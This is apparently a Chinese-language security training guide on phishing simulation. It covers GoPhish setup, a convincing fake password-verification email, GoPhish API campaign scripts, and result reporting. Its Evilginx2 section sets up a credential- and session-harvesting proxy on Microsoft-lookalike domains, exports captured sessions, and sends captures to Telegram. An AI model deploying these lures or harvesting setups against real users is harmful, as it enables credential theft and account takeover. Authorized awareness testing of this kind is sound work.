---
id: 23-001
title: "🎣 钓鱼邮件模拟 (Phishing Simulation)"
category: 社会工程学
category_en: "Social Engineering"
difficulty: ★★★
tools: "GoPhish, Evilginx2, SET, Modlishka, Muraena"
last_updated: 2025-07
tags: ["social-engineering", "phishing", "vishing", "physical-security", "awareness"]
subdomain: social-engineering
nist_csf: ["PR.AT-01", "PR.AT-02"]
mitre_attack: ["T1566", "T1598", "T1204"]
---
# 🎣 钓鱼邮件模拟 (Phishing Simulation)

## 概述

钓鱼邮件模拟是评估组织员工安全意识和检测安全控制的有效方法。通过构造逼真的钓鱼场景，测量员工的识别和响应能力，持续提升组织的防钓鱼能力。

## 核心技能

### 1. GoPhish 钓鱼平台部署

```bash
# GoPhish 安装与配置
# 下载并解压
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*-linux-64bit.zip
cd gophish

# 修改配置 (config.json)
cat << 'EOF' > config.json
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "server.crt",
    "key_path": "server.key"
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}
EOF

# 启动服务
chmod +x gophish
./gophish

# 默认管理员账号: admin / 首次运行生成随机密码
# 访问管理界面: https://localhost:3333
```

### 2. 钓鱼邮件模板制作

```html
<!-- 仿真的密码重置邮件模板 -->
<html>
<head><meta charset="utf-8"></head>
<body style="font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
  
  <!-- 头部Logo -->
  <div style="background: #0078d4; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
    <span style="color: white; font-size: 24px;">IT 安全中心</span>
  </div>
  
  <!-- 邮件内容 -->
  <div style="padding: 30px;">
    <p>尊敬的 {{.FirstName}} {{.LastName}}，</p>
    <p>系统检测到您的账户存在异常登录行为，</p>
    <p style="color: #d9534f; background: #f2dede; padding: 15px; border-radius: 5px;">
      ⚠️ 疑似密码泄露风险
    </p>
    <p>请立即点击下方按钮验证您的账户：</p>
    <div style="text-align: center; margin: 25px 0;">
      <a href="{{.URL}}" style="background: #0078d4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-size: 16px;">
        立即验证账户
      </a>
    </div>
    <p style="color: #999; font-size: 12px;">
      如果您未请求此操作，请忽略此邮件。<br>
      此链接将在 30 分钟后过期。
    </p>
  </div>
  
  <!-- 页脚 -->
  <div style="background: #f5f5f5; padding: 15px; border-radius: 0 0 8px 8px; text-align: center; color: #999; font-size: 11px;">
    © 2025 IT 安全中心 · 此邮件由系统自动发送，请勿回复
  </div>
</div>
</body>
</html>
```

### 3. 钓鱼页面克隆 (Evilginx2)

```bash
# Evilginx2 安装与配置
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

# 配置域名
sudo ./evilginx -p ./phishlets/

# 配置Evilginx2
config domain o365-login.com
config ip 0.0.0.0

# 创建钓鱼域名
config domain microsoft-verify.com

# 加载phishlet
phishlets hostname outlook o365-login.microsoft-verify.com

# 启用phishlet
phishlets enable outlook

# 获取钓鱼链接
phishlets get-url outlook

# 查看捕获的凭证
sessions

# 导出捕获数据
sessions export --format json

# 设置Telegram通知
config notifications tg https://api.telegram.org/bot<TOKEN>/sendMessage -c <CHAT_ID>
```

### 4. 钓鱼测试自动化

```python
#!/usr/bin/env python3
# GoPhish API 自动化钓鱼测试

import requests
import json
import csv
import time

class GoPhishAutomation:
    def __init__(self, host, api_key):
        self.base_url = f"https://{host}:3333/api"
        self.headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
    
    def create_group(self, name, targets_csv):
        """从CSV导入目标用户组"""
        targets = []
        with open(targets_csv, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                targets.append({
                    "first_name": row['first_name'],
                    "last_name": row['last_name'],
                    "email": row['email'],
                    "position": row.get('position', '')
                })
        
        group = {
            "name": name,
            "targets": targets
        }
        resp = requests.post(
            f"{self.base_url}/groups/",
            json=group, headers=self.headers, verify=False
        )
        return resp.json()['id']
    
    def create_template(self, name, subject, html_file):
        """创建邮件模板"""
        with open(html_file, 'r') as f:
            html_content = f.read()
        
        template = {
            "name": name,
            "subject": subject,
            "html": html_content
        }
        resp = requests.post(
            f"{self.base_url}/templates/",
            json=template, headers=self.headers, verify=False
        )
        return resp.json()['id']
    
    def launch_campaign(self, name, group_id, template_id, landing_page_id,
                       send_by_date, smtp_id):
        """启动钓鱼测试"""
        campaign = {
            "name": name,
            "groups": [group_id],
            "template": template_id,
            "page": landing_page_id,
            "send_by_date": send_by_date,
            "smtp": smtp_id
        }
        resp = requests.post(
            f"{self.base_url}/campaigns/",
            json=campaign, headers=self.headers, verify=False
        )
        return resp.json()['id']
    
    def get_results(self, campaign_id):
        """获取测试结果"""
        resp = requests.get(
            f"{self.base_url}/campaigns/{campaign_id}",
            headers=self.headers, verify=False
        )
        data = resp.json()
        stats = data['stats']
        print(f"发送: {stats['sent']}")
        print(f"打开: {stats['opened']}")
        print(f"点击: {stats['clicked']}")
        print(f"提交数据: {stats['data_submitted']}")
        print(f"钓鱼成功率: {(stats['data_submitted']/stats['sent'])*100:.1f}%")
        return data

# 使用示例
api = GoPhishAutomation("phish-server.company.com", "your-api-key")
group_id = api.create_group("IT部门测试", "targets.csv")
template_id = api.create_template("密码过期提醒", "您的密码将于今日过期", "template.html")
campaign_id = api.launch_campaign("Q3钓鱼测试", group_id, template_id, page_id, 
                                   "2025-08-01T12:00:00Z", smtp_id)
time.sleep(3600)  # 等待1小时后查看结果
api.get_results(campaign_id)
```

### 5. 钓鱼测试结果分析与报告

```python
# 钓鱼测试数据可视化分析
import pandas as pd
import matplotlib.pyplot as plt

# 分析各组织/部门的钓鱼成功率
df = pd.read_csv('phishing_results.csv')
dept_stats = df.groupby('department').agg({
    'sent': 'sum',
    'clicked': 'sum',
    'reported': 'sum'
}).reset_index()

dept_stats['success_rate'] = (dept_stats['clicked'] / dept_stats['sent']) * 100
dept_stats['report_rate'] = (dept_stats['reported'] / dept_stats['sent']) * 100

# 生成报告
print("=== 钓鱼测试总结报告 ===")
print(f"总测试人数: {df['sent'].sum()}")
print(f"点击率: {(df['clicked'].sum()/df['sent'].sum())*100:.1f}%")
print(f"报告率: {(df['reported'].sum()/df['sent'].sum())*100:.1f}%")
print(f"\n最易受骗部门:")
print(dept_stats.nlargest(3, 'success_rate')[['department', 'success_rate']])
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| GoPhish | 开源钓鱼测试框架 | https://getgophish.com/ |
| Evilginx2 | 反向代理钓鱼框架 | https://github.com/kgretzky/evilginx2 |
| SET | 社会工程学工具包 | https://github.com/trustedsec/social-engineer-toolkit |
| Modlishka | 反向代理钓鱼 | https://github.com/drk1wi/Modlishka |
| Phishing Frenzy | Ruby钓鱼框架 | https://github.com/pentestgeek/phishing-frenzy |

## 参考资源

- [MITRE ATT&CK T1566 — Phishing](https://attack.mitre.org/techniques/T1566/)
- [SANS Phishing Security Resources](https://www.sans.org/security-awareness-training/)
- [CISA Phishing Guide](https://www.cisa.gov/uscert/ncas/tips/ST04-014)
- [OWASP Phishing](https://owasp.org/www-community/attacks/Phishing)
